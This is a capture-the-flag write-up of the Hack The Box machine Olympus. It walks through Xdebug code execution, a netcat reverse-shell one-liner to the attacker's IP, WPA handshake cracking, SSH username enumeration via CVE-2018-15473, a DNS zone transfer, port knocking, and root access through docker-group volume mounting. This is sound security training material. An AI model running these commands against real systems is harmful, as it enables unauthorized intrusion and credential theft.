# Olympus

This is the write-up for the box Olympus that got retired at the 22nd September 2018.
My IP address was 10.10.14.36 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.83    olympus.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/olympus.nmap 10.10.10.83
```

```markdown
PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
53/tcp   open     domain  (unknown banner: Bind)
| dns-nsid:
|_  bind.version: Bind
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|     bind
|_    Bind
80/tcp   open     http    Apache httpd
|_http-server-header: Apache
|_http-title: Crete island - Olympus HTB
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-City of olympia
| ssh-hostkey:
|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.80%I=7%D=6/27%Time=5EF78736%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,3F,"\0=\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x05\x04Bind\xc0\x0c\
SF:0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.80%I=7%D=6/27%Time=5EF78731%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"SSH-2\.0-City\x20of\x20olympia\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\r\n");
```

## Checking HTTP (Port 80)

On the web page there is only an image of the face of a statue allegedly from Zeus because the image is called _zeus.jpg_.
When looking at the Response header of the site with any proxy tool like **Burpsuite**, there is an unusual parameter called _Xdebug_:
```markdown
HTTP/1.1 200 OK
(...)
Xdebug: 2.5.5
(...)
```

This is a debug instance that a developer can connect to, to debug the web application.
Generally this service only listens on localhost, but lets see if it has some misconfigurations.

### Exploiting Xdebug

For this I will use the [Xdebug Chromium extension](https://chrome.google.com/webstore/detail/xdebug/nhodjblplijafdpjjfhhanfmchplpfgl).
After clicking on _LISTEN_ it listens on the localhost on port 9000. Now to connect to the servers Xdebug connection, it needs the following HTTP request:
```markdown
GET /?XDEBUG_SESSION_START=SessionName HTTP/1.1
Host: 10.10.10.83
(...)
```

This doesn't show any response but in the Xdebug extension, it shows the whole script from the web page.
I will set a breakpoint on line 20 and append a test string to it:

![Xdebug Test](https://kyuu-ji.github.io/htb-write-up/olympus/olympus_xdebug-1.png)

After changing the variable, click _Run_ again and **Burpsuite** will show the added string, which means it is possible to change contents on the page.
Lets try code execution by sending a `ping` command:
```markdown
system("ping -c 1 10.10.14.36")
```

Now listening on ICMP packets with `tcpdump -i tun0 icmp` and it worked, which means successful code execution and starting a reverse shell:
```markdown
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 9001 >/tmp/f
```

After sending the request, the listener on my IP and port 9001 starts a revere shell session as _www-data_.

## Privilege Escalation 1

When checking the `hostname` and the IP address of the current environment, it becomes clear that this is not the box, but a virtualized client on the box itself:
```markdown
hostname: _f00ba96171c5_
ifconfig: _inet addr:172.20.0.2_
```

These random hostnames are known from **Docker container** instances and the file _.dockerenv_ in the root directory (/) confirms this.

There is one user directory _/home/zeus/_ with one folder, named _airgeddon_ and in there is code and the binaries for the open-source tool **Airgeddon**, that is used to scan and attack wireless networks. In the subfolder _captured_ are two files:

- papyrus.txt:
```markdown
Captured while flying. I'll banish him to Olympia - Zeus
```

- captured.cap
  - `tcpdump` packet capture file

Lets download the capture file to our local client to analyze it further.

### Analyzing the packet capture

The packet capture can be analyzed with **Wireshark** and it consists of wireless connections of the SSID _"Too_cl0se_to_th3_Sun"_. It is encrypted traffic and the group cipher suite is AES (CCM) which is used by _WPA_.
Lets try to crack the WPA key with **aircrack-ng**:
```markdown
aircrack-ng captured.cap .w /usr/share/wordlists/rockyou.txt
```

This takes about one hour and it is also possible with **Hashcat** by converting it to a Hashcat-readable capture file. To do that, the [Hashcat Utils](https://github.com/hashcat/hashcat-utils) are needed:
```markdown
./cap2hccapx.bin captured.cap captured.hccapx
```

Cracking it with **Hashcat**:
```markdown
hashcat -m 2500 captured.hccapx /usr/share/wordlists/rockyou.txt
```

After a while it gets cracked and shows us the WPA key for the SSID _Too_cl0se_to_th3_Sun_:
> flightoficarus

Now the traffic can be decrypted in Wireshark:
```markdown
Edit --> Preferences --> Protocols --> IEEE 802.11 --> Decryption Keys --> Add _wpa-pwd_ with key
```

By filtering for only UDP and TCP packets, it is easier to see the important traffic, but there is nothing of value in this packet capture.
As this is a valid password, maybe it was reused on the box, so we can try out to enumerate usernames to use this password with.

### Enumerating usernames

To brute-force SSH usernames, the vulnerability [CVE-2018-15473](https://github.com/Rhynorater/CVE-2018-15473-Exploit) will be used.
The wordlist will not be default usernames but as the theme of the box is _Greek mythological characters_, is is probably more efficient to create a custom wordlist with those names.

Running the exploit with the custom wordlist:
```markdown
python sshUsernameEnumExploit.py --port 2222 --userList greek_chars.txt 10.10.10.83
```

After finishing, it shows that the username _icarus_ is a valid user.
Connecting via SSH on port 2222 into the box with that username and trying out the _SSID_ and the _key_:
```markdown
ssh -p 2222 icarus@10.10.10.83
```

The SSID as the password works and we are logged in on the box as _icarus_.

## Privilege Escalation 2

This environment is still a Docker container so lets look for a way to get to the real box.
In the home folder of _icarus_ is a text file called _help_of_the_gods.txt_ with the following content:
```markdown
Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb
```

As the initial Nmap scan showed, **DNS** is listening on the box, so lets check the **DNS Zone Transfers** on this domain:
```markdown
dig axfr @10.10.10.83 ctfolympus.htb
```
```markdown
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.         86400   IN      TXT     "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.         86400   IN      A       192.168.0.120
ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.
ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
ctfolympus.htb.         86400   IN      MX      10 mail.ctfolympus.htb.
crete.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
hades.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
mail.ctfolympus.htb.    86400   IN      A       192.168.0.120
ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120
rhodes.ctfolympus.htb.  86400   IN      CNAME   ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN TXT     "Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.     86400   IN      CNAME   ctfolympus.htb.
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
```

The TXT-record that tells us to open a temporal portal to Hades looks like, it wants us to do **port knocking** on the ports to open another port.
As SSH is filtered, it could that one and _"St34l_th3_F1re!"_ the password.

Port knocking the ports and simultaneously connecting to SSH with _prometheus_:
```markdown
ssh prometheus@10.10.10.83
```
```markdown
nmap -Pn --max-retries=0 --scan-delay=1 -p 3456,8234,62431 10.10.10.83;
```

After some tries the SSH prompt asks for a password and the string from the TXT-record works.

### Privilege Escalation to root

We know that Docker is installed, so it is a good idea to check if it is possible to abuse misconfigurations in that.
The user _prometheus_ is a member of the Docker group as `groups` shows, so running Docker commands works:
```markdown
docker container ls
```
```markdown
CONTAINER ID    IMAGE     COMMAND                   PORTS                                     NAMES
f00ba96171c5    crete     "docker-php-entrypoi…"    0.0.0.0:80->80/tcp                        crete
ce2ecb56a96e    rodhes    "/etc/bind/entrypoin…"    0.0.0.0:53->53/tcp, 0.0.0.0:53->53/udp    rhodes
620b296204a3    olympia   "/usr/sbin/sshd -D"       0.0.0.0:2222->22/tcp                      olympia
```

Bind mounting the local volume of the host on one of the containers to get access to the file system:
```markdown
docker run -v /:/mnt/testname -it olympia bash
```

In the path _/mnt/testname_ inside of the container, the local file system is mounted and it is possible to read the root flag and do everything that root can do!
